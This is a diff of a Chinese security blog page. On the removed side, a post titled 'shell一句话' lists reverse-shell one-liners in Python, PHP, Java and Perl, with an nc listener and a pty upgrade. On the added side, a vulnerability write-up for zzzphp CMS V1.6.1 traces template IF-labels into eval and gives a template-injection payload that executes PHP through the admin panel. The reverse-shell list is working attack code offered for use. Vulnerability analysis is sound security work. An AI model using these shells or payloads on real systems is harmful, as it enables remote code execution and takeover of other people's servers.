@@ -11,7 +11,7 @@
 
     <title>
         
-        shell一句话 - undefined
+        zzzphp V1.6.1 远程代码执行漏洞分析 - undefined
         
     </title>
 
@@ -87,7 +87,7 @@
     </div>
     
         <div id="toc" class="toc-article">
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#zzzphp-V1-6-1-远程代码执行漏洞分析"><span class="toc-text">zzzphp V1.6.1 远程代码执行漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#zzzphp-cms-，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。"><span class="toc-text">zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。</span></a></li></ol></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#发现是跳到-inc-zzz-client-php，那么我们就来到-inc-zzz-client-php"><span class="toc-text">#####发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php</span></a></li>
 </div>
     
 </div>
@@ -117,15 +117,15 @@
 
 <div class="post-container">
     <div class="post-title">
-        shell一句话
+        zzzphp V1.6.1 远程代码执行漏洞分析
     </div>
 
     <div class="post-meta">
-        <span class="attr">发布于：<span>2019-03-06 01:19:41</span></span>
+        <span class="attr">发布于：<span>2019-03-18 18:29:15</span></span>
         
         <span class="attr">标签：/
         
-        <a class="tag" href="/tags/#shell" title="shell">shell</a>
+        <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
         <span>/</span>
         
         
@@ -135,19 +135,18 @@
 
     </div>
     <div class="post-content ">
-        <p>###python脚本反弹<br>    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’</p>
-<p>###php 脚本反弹<br>    php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<p>###Java 脚本反弹<br>    r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()</p>
-<p>###perl 脚本反弹<br>    perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>###NC 监听一句话<br>    nc -v -l -v -p 8080</p>
-<p>#####NC 无法使用su命令解决办法：<br>    python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
-<p>python脚本反弹</p>
-<p>python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.31.41”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’<br>php 脚本反弹</p>
-<p>php -r ‘$sock=fsockopen(“192.168.31.41”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Java 脚本反弹</p>
-<p>r = Runtime.getRuntime()p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&5; done”] as String[])p.waitFor()<br>perl 脚本反弹</p>
-<p>perl -e ‘use Socket;$i=”192.168.31.41”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’<br>NC 监听一句话</p>
-<p>nc -v -l -v -p 8080<br>NC 无法使用su命令解决办法：</p>
-<p>python -c ‘import pty; pty.spawn(“/bin/sh”)’</p>
+        <h2 id="zzzphp-V1-6-1-远程代码执行漏洞分析"><a href="#zzzphp-V1-6-1-远程代码执行漏洞分析" class="headerlink" title="zzzphp V1.6.1 远程代码执行漏洞分析"></a>zzzphp V1.6.1 远程代码执行漏洞分析</h2><p>###漏洞产生原因：</p>
+<h5 id="zzzphp-cms-，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。"><a href="#zzzphp-cms-，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。" class="headerlink" title="zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。"></a>zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。</h5><p>###源码审计：</p>
+<p>#####打开/search/index.php<br><code>require dirname(dirname(__FILE__)). &#39;/inc/zzz_client.php&#39;;</code></p>
+<h2 id="发现是跳到-inc-zzz-client-php，那么我们就来到-inc-zzz-client-php"><a href="#发现是跳到-inc-zzz-client-php，那么我们就来到-inc-zzz-client-php" class="headerlink" title="#####发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php"></a>#####发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php</h2><p><img src="https://p0.ssl.qhimg.com/t01d5725f65d9c71035.png" alt=""></p>
+<p>#####发现解析模块是通过ParsetTemplate来解析的，那么我们找到ParserTemplate类的php文件zzz_template.php。</p>
+<p>####在zzz_template.php中我们发现一个IF语句<br><code>$zcontent = $this-&gt;parserIfLabel( $zcontent ); // IF语句</code></p>
+<p>#####那么我们来到zzz_template.php中对parserIfLabel的定义<br><img src="https://p2.ssl.qhimg.com/t016ef6c558b283cbf0.png" alt=""></p>
+<p>#####发现$ifstr 经过一连串的花里胡哨的过滤最后进了evel函数，然后使用了evel函数执行，最后造成了本次远程代码执行漏洞。</p>
+<p>###漏洞利用：</p>
+<p>#####在后台模块管理中的电脑模块找到cn2016<br><img src="https://p3.ssl.qhimg.com/t0104a9b5787949c950.png" alt=""></p>
+<p>#####然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为<code>{if:assert($_request[phpinfo()])}phpinfo();{end if}</code><br><img src="https://p5.ssl.qhimg.com/t0162996d1326d78828.png" alt=""></p>
+<p>#####然后打开<code>http://xxxx.com/zzzcms/search/</code>就可以看到我们刚刚输入的phpinfo()执行了。</p>
 
         
         <br>
